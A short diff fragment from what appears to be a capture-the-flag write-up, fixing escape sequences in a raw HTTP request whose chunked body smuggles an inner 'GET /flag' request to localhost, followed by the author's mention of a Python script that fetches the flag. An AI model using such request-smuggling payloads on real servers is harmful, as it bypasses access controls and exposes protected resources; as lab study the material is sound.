@@ -341,9 +341,9 @@ Connection: keep-alive\r\n
 \r\n3a\r\n
 GET /flag HTTP/1.1\r\n
 Host: localhost\r\n
-Content-Length: 7\r\n\
+Content-Length: 7\r\n
 
-r\n\r\n0\r\n\r\n
+\r\n\r\n0\r\n\r\n
 ```
 
 I run this python script to get the flag:
